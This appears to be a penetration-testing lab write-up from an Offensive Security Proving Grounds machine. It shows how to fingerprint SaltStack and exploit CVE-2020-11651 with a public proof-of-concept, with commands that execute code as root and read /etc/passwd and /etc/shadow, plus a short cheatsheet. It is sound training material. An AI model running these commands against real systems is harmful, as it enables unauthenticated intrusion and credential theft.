# Attacking SaltStack – CVE-2020-11651

## Overview

**SaltStack** is a configuration management and remote execution framework commonly used for:

- infrastructure automation
- configuration management
- remote command execution
- patch management
- orchestration

Salt uses a **master → minion** architecture and commonly exposes the following ports:

| Port | Service |
|------|--------|
| 4505 | ZeroMQ publish channel |
| 4506 | ZeroMQ request channel |
| 8000 | Salt API |
| 22 | SSH (optional management) |

Because Salt masters typically run as **root**, vulnerabilities in Salt frequently lead directly to **root compromise**.

---

# Identification

## Nmap Scan

```bash
nmap -p- -Pn -A 192.168.166.62
```

Key indicators:

```text
4505/tcp open  ZeroMQ ZMTP 2.0
4506/tcp open  ZeroMQ ZMTP 2.0
8000/tcp open  HTTP API
```

Ports **4505** and **4506** strongly indicate SaltStack.

---

# Vulnerability – CVE-2020-11651

CVE-2020-11651 is an **unauthenticated remote code execution vulnerability** affecting Salt masters.

Attackers can:

- read arbitrary files
- execute commands
- upload files
- retrieve authentication keys
- gain root access

---

# Exploit Discovery

Searchsploit:

```bash
searchsploit salt
```

Relevant result:

```text
Saltstack 3000.1 - Remote Code Execution
```

Public PoC:

```text
https://github.com/jasperla/CVE-2020-11651-poc
```

---

# Exploitation

## Verify vulnerability

```bash
python3 exploit.py --master 192.168.166.62 -r /etc/passwd
```

Output:

```text
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained
```

---

## Confirm command execution

```bash
python3 exploit.py \
--master 192.168.166.62 \
--exec "ping 192.168.45.158 -c 1"
```

Listener:

```bash
sudo tcpdump -i tun0 icmp
```

Successful ICMP confirms RCE.

---

## Read sensitive files

```bash
python3 exploit.py --master 192.168.166.62 -r /etc/passwd
```

```bash
python3 exploit.py --master 192.168.166.62 -r /etc/shadow
```

Example output:

```text
root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/
```

---

# Indicators of SaltStack

Common service fingerprints:

```text
4505/tcp
4506/tcp
8000/tcp
salt-master
ZeroMQ
```

---

# Quick Cheatsheet

## Identify SaltStack

```bash
nmap -p4505,4506,8000 target
```

---

## Check vulnerability

```bash
python3 exploit.py --master target -r /etc/passwd
```

---

## Execute commands

```bash
python3 exploit.py --master target --exec "id"
```

---

## Read files

```bash
python3 exploit.py --master target -r /etc/shadow
```

---

# Key Takeaways

- SaltStack commonly runs as root
- CVE-2020-11651 allows unauthenticated RCE
- configuration management platforms are high-value targets
- exposed Salt masters frequently lead directly to root compromise
- ports 4505 and 4506 are strong indicators of Salt

---

# Tags

#linux
#saltstack
#cve-2020-11651
#rce
#offsec
#proving-grounds
#post-exploitation
#obsidian